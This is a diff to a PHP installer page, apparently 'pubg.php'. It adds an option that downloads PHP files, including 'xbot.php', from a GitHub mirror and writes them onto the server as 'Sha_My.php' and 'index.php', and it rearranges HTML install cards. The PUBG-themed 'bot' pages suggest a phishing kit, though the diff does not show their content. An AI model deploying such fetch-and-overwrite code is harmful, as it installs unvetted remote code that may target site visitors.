@@ -110,7 +110,15 @@ if($install=="S"){
 $shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/s-bot.php");
 $xx = file_put_contents("Sha_My.php", $shamy);
 
-$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/S.php');
+$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/S1.php');
+$xx = file_put_contents("index.php", $index);
+}
+if($install=="X"){
+	
+$shamy = file_get_contents("https://raw.githack.com/ahmed-shamy/pubg/main/xbot.php");
+$xx = file_put_contents("Sha_My.php", $shamy);
+
+$index = file_get_contents('https://raw.githack.com/ahmed-shamy/pubg/main/X.php');
 $xx = file_put_contents("index.php", $index);
 }
 }
@@ -143,10 +151,10 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
 <center>
 <tr>
 <td>
-		<center>
+<center>
 		<div class="card">
-  <img src="https://i.ibb.co/zZykRM6/125220142-661503521181538-383095617947085414-n.jpg" style="width:100%">
-  <p><a href="pubg.php?index=MT"><button>Install</button></a></p>
+  <img src="https://i.ibb.co/37jDm9T/129115007-1874024536095409-4186398985760583330-n.png" style="width:100%">
+  <p><a href="pubg.php?index=X"><button>Install</button></a></p>
 </div>
 </center>
 </td>
@@ -165,10 +173,10 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
 <center>
 <tr>
 <td>
-<center>
+		<center>
 		<div class="card">
-  <img src="https://i.ibb.co/BtwFn9n/125303850-183525890088980-1519732218801491935-n.png" style="width:100%">
-  <p><a href="pubg.php?index=M"><button>Install</button></a></p>
+  <img src="https://i.ibb.co/zZykRM6/125220142-661503521181538-383095617947085414-n.jpg" style="width:100%">
+  <p><a href="pubg.php?index=MT"><button>Install</button></a></p>
 </div>
 </center>
 </td>
@@ -201,6 +209,22 @@ document.getElementsByClassName("cbalink")[0].style.display = "none";
   <p><a href="pubg.php?index=F"><button>Install</button></a></p>
 </div>
 </center>
+</td>
+</tr>
+</center>
+</table>
+<table border="0" width="100%">
+<center>
+<tr>
+<td>
+<center>
+		<div class="card">
+  <img src="https://i.ibb.co/BtwFn9n/125303850-183525890088980-1519732218801491935-n.png" style="width:100%">
+  <p><a href="pubg.php?index=M"><button>Install</button></a></p>
+</div>
+</center>
+</td>
+<td>
 </td>
 </tr>
 </center>
